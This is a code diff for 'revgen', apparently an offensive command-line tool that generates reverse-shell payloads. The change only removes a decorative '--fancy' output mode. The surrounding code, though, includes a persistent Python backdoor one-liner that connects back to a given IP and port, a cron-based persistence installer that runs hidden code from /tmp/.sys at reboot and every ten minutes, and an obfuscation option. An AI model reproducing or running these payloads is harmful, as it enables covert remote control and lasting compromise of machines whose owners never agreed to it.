@@ -23,7 +23,7 @@ sys.path.insert(0, script_dir)
 from utils.generator import PayloadGenerator
 from utils.banner import (
     print_banner, print_success, print_error, print_warning, print_info,
-    format_payload_output, animate_progress, print_usage_tip, print_legal_warning,
+    format_payload_output, print_usage_tip, print_legal_warning,
     Colors
 )
 from utils.helpers import (
@@ -59,7 +59,7 @@ class RevGenCLI:
             epilog="""
 Examples:
   revgen --ip 192.168.1.100 --port 4444 --lang bash
-  revgen --ip 10.0.0.5 --port 9001 --all --fancy
+  revgen --ip 10.0.0.5 --port 9001 --all
   revgen --ip 2001:db8::1 --port 8080 --lang python --copy
   revgen --ip 192.168.1.50 --port 4444 --lang php --obfuscate
   revgen --list
@@ -81,8 +81,6 @@ Remember: Only use on systems you own or have permission to test! 🔒
                           help='List all available shell languages')
         
         # Output options
-        parser.add_argument('--fancy', '-f', action='store_true', 
-                          help='Enable fancy output with ASCII art and styling')
         parser.add_argument('--copy', '-c', action='store_true', 
                           help='Copy payload to clipboard')
         parser.add_argument('--obfuscate', '-o', action='store_true', 
@@ -186,33 +184,17 @@ Remember: Only use on systems you own or have permission to test! 🔒
             print_error(f"Failed to initialize payload generator: {e}")
             return False
     
-    def list_shells(self, fancy: bool = False):
+    def list_shells(self):
         """List available shell languages"""
         if not self.generator and not self.initialize_generator():
             return
         
         shells = self.generator.get_available_shells()
-        stats = self.generator.get_payload_stats()
         
-        if fancy:
-            print_banner("genie", fancy=True)
-            print(f"\n{Colors.NEON_CYAN}{Colors.BOLD}🔮 Available Shell Languages 🔮{Colors.RESET}")
-            print(f"{Colors.CYAN}╔{'═' * 50}╗{Colors.RESET}")
-            
-            for i, shell in enumerate(shells, 1):
-                info = self.generator.get_shell_info(shell)
-                name = info.get('name', shell) if info else shell
-                desc = info.get('description', 'No description') if info else 'No description'
-                
-                print(f"{Colors.CYAN}║{Colors.YELLOW} {i:2d}. {name:<20} {Colors.DIM}{desc[:20]:<20} {Colors.CYAN}║{Colors.RESET}")
-            
-            print(f"{Colors.CYAN}╚{'═' * 50}╝{Colors.RESET}")
-            print(f"\n{Colors.GREEN}📊 Total: {stats['total_shells']} shells, {stats['ipv6_shells']} IPv6 variants{Colors.RESET}")
-        else:
-            print("Available shell languages:")
-            for shell in shells:
-                print(f"  • {shell}")
-            print(f"\nTotal: {len(shells)} shells available")
+        print("Available shell languages:")
+        for shell in shells:
+            print(f"  • {shell}")
+        print(f"\nTotal: {len(shells)} shells available")
     
     def generate_single_payload(self, ip: str, port: int, shell_type: str, args) -> bool:
         """Generate a single payload"""
@@ -220,9 +202,6 @@ Remember: Only use on systems you own or have permission to test! 🔒
             return False
         
         try:
-            if not args.quiet and args.fancy:
-                animate_progress(f"Conjuring {shell_type} payload")
-            
             payload, info = self.generator.generate_payload(ip, port, shell_type)
             
             # Apply obfuscation if requested
@@ -235,8 +214,7 @@ Remember: Only use on systems you own or have permission to test! 🔒
             output = format_payload_output(
                 info.get('name', shell_type), 
                 payload, 
-                info.get('description', ''),
-                fancy=args.fancy
+                info.get('description', '')
             )
             print(output)
             
@@ -268,9 +246,6 @@ Remember: Only use on systems you own or have permission to test! 🔒
             return False
         
         try:
-            if not args.quiet and args.fancy:
-                animate_progress("Conjuring all payloads")
-            
             all_payloads = self.generator.generate_all_payloads(ip, port)
             
             if not args.quiet:
@@ -296,8 +271,7 @@ Remember: Only use on systems you own or have permission to test! 🔒
                 output = format_payload_output(
                     info.get('name', shell_type),
                     payload,
-                    info.get('description', ''),
-                    fancy=args.fancy
+                    info.get('description', '')
                 )
                 print(output)
                 print()  # Add spacing
@@ -371,9 +345,6 @@ Remember: Only use on systems you own or have permission to test! 🔒
     
     def generate_backdoor(self, ip: str, port: int, args):
         """Generate persistent backdoor payload"""
-        if args.fancy:
-            print_banner("skull", fancy=True)
-        
         backdoor_code = f'''import socket,subprocess,os,time,threading,sys
 class B:
  def __init__(s,i,p):s.i,s.p,s.r=i,p,True
@@ -419,16 +390,8 @@ B("{ip}",{port}).run()'''.replace('\n', ';').replace(' ', '')
         
         backdoor_payload = f'python3 -c "{backdoor_code}" &'
         
-        if args.fancy:
-            output = format_payload_output(
-                "Persistent Backdoor",
-                backdoor_payload,
-                "True background backdoor - survives terminal closure",
-                fancy=True
-            )
-        else:
-            output = f"{Colors.BOLD}{Colors.RED}[Persistent Backdoor]{Colors.RESET}\\n{backdoor_payload}"
-            output += f"\\n{Colors.DIM}{Colors.CYAN}💀 True background backdoor - survives terminal closure{Colors.RESET}"
+        output = f"{Colors.BOLD}{Colors.RED}[Persistent Backdoor]{Colors.RESET}\\n{backdoor_payload}"
+        output += f"\\n{Colors.DIM}{Colors.CYAN}💀 True background backdoor - survives terminal closure{Colors.RESET}"
         
         print(output)
         
@@ -444,9 +407,6 @@ B("{ip}",{port}).run()'''.replace('\n', ';').replace(' ', '')
     
     def generate_persistence(self, ip: str, port: int, args):
         """Generate persistence installer"""
-        if args.fancy:
-            print_banner("fire", fancy=True)
-        
         persistence_code = f'''import os,subprocess,sys
 try:
  c="@reboot python3 -c \\"import socket,subprocess,os,time,threading;exec(open('/tmp/.sys').read())\\" >/dev/null 2>&1\\n*/10 * * * * python3 -c \\"import socket,subprocess,os,time,threading;exec(open('/tmp/.sys').read())\\" >/dev/null 2>&1\\n"
@@ -460,16 +420,8 @@ exec(open(__file__).read() if '__file__' in globals() else "")'''.replace('\n', 
         
         persistence_payload = f'python3 -c "{persistence_code}"'
         
-        if args.fancy:
-            output = format_payload_output(
-                "Persistence Installer",
-                persistence_payload,
-                "Installs cron jobs for automatic startup/reconnection",
-                fancy=True
-            )
-        else:
-            output = f"{Colors.BOLD}{Colors.MAGENTA}[Persistence Installer]{Colors.RESET}\\n{persistence_payload}"
-            output += f"\\n{Colors.DIM}{Colors.CYAN}🔥 Installs cron jobs for automatic startup/reconnection{Colors.RESET}"
+        output = f"{Colors.BOLD}{Colors.MAGENTA}[Persistence Installer]{Colors.RESET}\\n{persistence_payload}"
+        output += f"\\n{Colors.DIM}{Colors.CYAN}🔥 Installs cron jobs for automatic startup/reconnection{Colors.RESET}"
         
         print(output)
         
@@ -490,9 +442,7 @@ exec(open(__file__).read() if '__file__' in globals() else "")'''.replace('\n', 
         # Show banner (unless disabled or in quiet mode)
         if not args.no_banner and not args.quiet:
             if args.banner:
-                print_banner(args.banner, fancy=args.fancy)
-            elif args.fancy:
-                print_banner("random", fancy=True)
+                print_banner(args.banner)
             else:
                 print_banner("main")
         
@@ -506,7 +456,7 @@ exec(open(__file__).read() if '__file__' in globals() else "")'''.replace('\n', 
         
         # Handle list mode
         if args.list:
-            self.list_shells(fancy=args.fancy)
+            self.list_shells()
             return
         
         # Handle listener checking
